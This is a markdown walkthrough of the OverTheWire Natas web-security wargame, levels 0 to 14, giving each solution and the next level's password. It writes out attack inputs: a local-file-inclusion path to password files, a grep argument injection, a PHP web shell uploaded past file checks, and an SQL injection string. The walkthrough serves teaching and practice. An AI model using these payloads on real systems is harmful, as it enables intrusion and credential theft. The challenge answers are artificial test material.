# 🚩 OverTheWire: Natas Wargame Solutions - Level 0 to Level 14

- - - 
**Level 0**
The password is inside an HTML comment. Use **Inspect Element** to find it.

- - - 
**Level 1**
The password is in the page's source code. Press `Ctrl+U` to view it.

- - -
**Level 2**
The page source reveals a directory path (`.../files/pixel.png`).
Navigate to the parent directory (`.../files/`) in the browser to discover the password file.

password for next level:`3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

- - -
**Level 3**
An HTML comment hints: "Not even Google will find it."
This refers to `robots.txt`, which controls search engine indexing. Check `.../robots.txt` to find the hidden path.

password for next level:`QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

- - -
**Level 4**
The page requires requests to come from specific location. Modify the **Referer** HTTP header to match the expected URL.

password for next level: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

- - - 
**Level 5**
Inspect the cookies and change the `loggedin` value to `1`.

password for next level: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

- - - 
**Level 6**
View source and see the if statement. the PHP program also includes a path, go to that path and submit the value 

password for next level: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

- - -
**Level 7**
The `page` parameter is vulnerable to Local File Inclusion (LFI).
Inject the path: `/etc/natas_webpass/natas8`

password for next level=`xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

- - -
**Level 8**
Analyze the source code and reverse the encryption function (Hex → Reverse string → Base64 decode).

password for next level=`ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

- - -
**Level 9**
The source code reveals a command injection vulnerability.

password for next level = `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

- - -
**Level 10**
Search this `-r . /etc/natas_webpass/*`

password for next level = `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

- - -
**Level 11**
Take the default JSON: `{"showpassword":"no","bgcolor":"#ffffff"}`
XOR it with the base64-decoded cookie → this reveals the *key*
Create new JSON: `{"showpassword":"yes","bgcolor":"#ffffff"}`
XOR that JSON with the recovered key.
Base64-encode the result → set it as the `data` cookie.
Refresh the page → password appears.

password for next level = `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

- - - 
**Level 12**
Read the source code and see that the extension checker is in the client side
change the jpeg to php and upload a php file
php file: `<?php system('cat /etc/natas_webpass/*'); ?>`

password for next level = `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
- - - 
**Level 13**
Like previous level but we need to write magic number to bypass the image checker
use `hexedit` command to add magic number of png to php file of previous level

password for next level = `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
- - -
**Level 14**
SQL Injection vulnerability.
Search `pelamar" or 1=1 #`

password for next level = `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
- - -